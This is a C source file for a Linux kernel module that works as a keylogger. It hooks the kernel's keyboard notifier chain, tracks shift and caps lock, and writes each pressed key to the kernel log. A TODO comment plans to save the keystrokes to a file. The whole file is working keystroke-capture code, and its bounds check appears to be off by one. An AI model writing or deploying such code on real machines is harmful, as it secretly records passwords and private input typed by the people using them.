#include "keylogger.h"


//    The used method does not manipulate any kernel datastructures or smth else, we just use the legitimate
//    kernel api.


static int currently_capslock = 0;

//Callback function, thats called when the notification chain emits a new event to its 'subscribers'.
static int keyboard_event_callback(struct notifier_block *nb, unsigned long action, void *data)
{
    if (!(action == KBD_KEYCODE)) return NOTIFY_OK;

    struct keyboard_notifier_param *params = (struct keyboard_notifier_param*) data;


    if ((params->value > KEYCODE_LOOKUP_TABLE_SIZE) || (params->shift >= 3)) return NOTIFY_OK;


    //TODO: change to persist keystrokes to file
    if (params->down) {

        if (params->value == 0x3A) {
            currently_capslock = 1 ^ currently_capslock;
            return NOTIFY_OK;
        }

        if (params->shift == 1) {
            printk(KERN_INFO "%s\n", keycode_lookup_table[params->value][params->shift ^ currently_capslock]);
        } else if (currently_capslock != 0 && params->shift == 0) {
            printk(KERN_INFO "%s\n", keycode_lookup_table[params->value][currently_capslock]);
        } else {
            printk(KERN_INFO "%s\n", keycode_lookup_table[params->value][params->shift]);
        }
    }
    
    return NOTIFY_OK; //event will be passed on in the notify loop
}


//we could also add a priority so that we will be added at the front of the list ~> prob no benefit
struct notifier_block np = {
    .notifier_call = keyboard_event_callback
};


void register_keylogger(void)
{
    pr_info("Registering keylogger\n");
    register_keyboard_notifier(&np);
}


void unregister_keylogger(void)
{
    pr_info("Unregistering keylogger\n");
    unregister_keyboard_notifier(&np);
}